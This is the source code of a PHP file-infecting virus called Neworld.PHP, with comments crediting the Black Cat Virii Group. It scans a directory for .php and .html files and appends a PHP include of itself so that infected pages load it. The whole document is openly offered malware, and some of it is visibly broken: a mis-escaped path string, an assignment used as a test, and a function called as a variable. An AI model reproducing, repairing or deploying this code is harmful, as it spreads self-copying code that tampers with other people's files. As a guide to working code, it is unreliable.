<?php

$vir_string = "Neworld.PHP\n";
$virstringm = "Welcome To The New World Of PHP Programming\n";
$virt	    = $vir_string . $virstringm;

echo	$virt;

$all = opendir('C:\Windows\');
while ($file = readdir($all))
{
	$inf = true;
	$exe = false;

	if ( ($exe = strstr ($file, '.php')) || ($exe = strstr ($file, '.html')) || ($exe = strstr ($file, '.htm')) || ($exe = strstr ($file, '.htt')) )
	if ( is_file($file) && is_writeable($file) )
	{
		
		
		$new = fopen($file, "r");
		$look = fread($new, filesize($file));
		$yes = strstr ($look, 'neworld.php');
		if (!$yes) $inf = false;
	}
	
	if ( ($inf=false) )
	{
		$new = fopen($file, "a");
		$fputs($new, "<!-- ");
		$fputs($new, "Neworld.PHP - ");
		$fputs($new, "Made By Xmorpfic, ");
		$fputs($new, "www.shadowvx.com/bcvg, ");
		$fputs($new, "The Black Cat Virii Group.");
		$fputs($new, "--->");
		$fputs($new, "<?php ");
		$fputs($new, "include(\"");
		$fputs($new, __FILE__);
		$fputs($new, "\"); ");
		$fputs($new, "?>");
		return;
	}
}
closedir($all);
// Neworld.PHP Virus - Made By Xmorfic, www.shadowvx.com/bcvg, Black Cat Virii Group.
?>